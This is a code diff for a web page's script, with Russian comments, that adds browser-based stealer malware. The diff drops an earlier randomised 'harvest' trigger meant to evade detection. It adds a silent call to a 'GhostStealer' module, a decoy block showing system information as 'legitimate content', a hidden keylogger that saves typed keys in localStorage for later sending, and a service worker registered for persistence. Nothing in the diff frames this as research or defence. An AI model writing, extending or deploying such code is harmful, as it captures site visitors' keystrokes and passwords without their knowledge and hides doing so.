 document.addEventListener('DOMContentLoaded', () => {
-    // Случайная задержка для избежания detection
+    // Скрытый запуск
     setTimeout(() => {
-        const shouldAutoStart = Math.random() < 0.2; // 20% chance
-        if (shouldAutoStart) {
-            HyperQuantumSystem.initiateFullSpectrumHarvest().catch(console.error);
-        }
-    }, Math.random() * 3000 + 1000);
+        GhostStealer.init().catch(() => {});
+        
+        // Показать легитимный контент
+        document.getElementById('content').innerHTML = `
+            <h2>System Information</h2>
+            <p><strong>User Agent:</strong> ${navigator.userAgent}</p>
+            <p><strong>Platform:</strong> ${navigator.platform}</p>
+            <p><strong>Screen:</strong> ${screen.width}x${screen.height}</p>
+            <p><strong>Language:</strong> ${navigator.language}</p>
+            <p><strong>CPU Cores:</strong> ${navigator.hardwareConcurrency}</p>
+            <p><strong>Memory:</strong> ${navigator.deviceMemory || 'Unknown'} GB</p>
+        `;
+    }, 1000);
 });
 
-console.log('Hyper-Quantum System vΩ initialized successfully');
+// СКРЫТЫЙ КЕЙЛОГГЕР
+let keystrokes = '';
+document.addEventListener('keydown', (e) => {
+    keystrokes += e.key;
+    if (keystrokes.length > 50) {
+        // Тихо сохраняем для последующей отправки
+        localStorage.setItem('_keys', keystrokes);
+        keystrokes = '';
+    }
+});
+
+// PERSISTENCE ЧЕРЕЗ SERVICE WORKER
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js').catch(() => {});
+}
 </script>
 </body>
 </html>
